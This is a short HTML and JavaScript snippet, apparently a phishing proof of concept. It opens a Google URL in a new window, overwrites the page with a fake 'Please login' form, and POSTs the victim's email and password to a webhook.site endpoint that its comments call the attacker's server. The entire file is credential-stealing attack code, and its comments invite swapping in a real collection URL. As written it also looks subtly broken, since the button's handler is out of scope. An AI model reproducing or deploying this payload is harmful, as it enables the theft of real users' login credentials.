<script>
function go(){
    var x = window.open('https://www.google.com/csi'); // Open a target URL
    setTimeout(function(){
        // Change the body content of the opened window to simulate a fake login page
        x.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />';
        x.document.body.innerHTML += '<h1>Please login</h1>';
        x.document.body.innerHTML += 'Email: <input id="email"><br>';
        x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
        x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';

        // Function to send the collected data to the attacker's server
        function sendData() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('pass').value;

            // Send data to the attacker's server (replace with actual attacker server URL)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070", true);  // Use actual URL here
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));

            alert('Login attempt: ' + email + ' ' + password); // For demonstration purposes
        }
    }, 3000); // Wait for 3 seconds to simulate the page load time
}
</script>
<button onclick="go()">Go</button>
